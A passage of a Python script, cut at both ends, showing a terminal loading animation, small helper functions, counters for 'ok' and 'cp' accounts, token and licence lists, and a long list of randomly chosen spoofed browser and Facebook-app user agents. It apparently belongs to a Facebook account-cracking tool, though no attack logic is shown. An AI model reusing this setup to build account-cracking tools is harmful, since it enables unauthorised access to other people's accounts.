"\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]"]
for i in range(len(animasi)):
    time.sleep(0.0100)
    sys.stdout.write("\r\x1b[0;32m Loading\x1b[0;36m  ------->  "+ random.choice(['\x1b[0;33m', '\x1b[0;36m', '\x1b[0;35m', '\x1b[0;36m', '\x1b[0;35m']) + animasi[i % len(animasi)])
    sys.stdout.flush()
os.system("clear")




# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
ua=random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400,Mozilla/5.0 (Linux; Android 5.1; en-US; E5533 Build/29.1.B.0.101) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Noki630/1.0 SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-us; nokiax2-02) U2/1.0.0 UCBrowser/8.7.1.234 U2/1.0.0 Mobile UNTRUSTED/1.0','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.6.12.9','Mozilla/5.0 (Linux; Android 8.1; DUA-L22 Build/HONORDUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; vi; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.0; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-gc','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/48.0.2564.82 Mobile Safari/537.36 Tepi/14.14332','Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; WebBrowser/8.1; IEMobile/11.0; NOKIA; Lumia 525) like Gecko UCBrowser/4.2.1.541 Mobile','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10570','Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/307.0.0.40.111;]','Mozilla/5.0 (Linux; U; Android 4.1.3; ru-RU; Nokia_X Build/GRK39F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF]','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 6.0; Redmi 4 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Mobile Safari/537.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.5.6','Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FB_IAB/FB4A;FBAV/127.0.0.22.69','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3638; U; en) Presto/2.8.119 Version/11.10','SAMSUNG-GT-C3312R Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.32584/144.30; U; en) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-I8200N Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30','Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414','Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/159.0.0.38.95;]','Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36[FB_IAB/FB4A;FBAV/311.0.0.44.117;]','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019)[FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Xperia Z3 Tablet Compact LTE Build/OPM8.190305.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.0(20416) Chrome/76.0.3809.111 Safari/537.36','Mozilla/5.0 (Linux; Android 10; Xperia Z3 Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692','Mozilla/5.0 (Linux; Android 9; Xperia Z3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/286.0.0.48.112;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.','Mozilla/5.0 (Linux; Android 8.0.0; Nokia 3.1 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/12.9.10.1166 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; SM-T295 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]','Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]','Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Huawei; H883G; HuaweiH883G)','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 CoolBrowser/33.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.1; ru-RU; SM-S920L Build/KOT49E) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 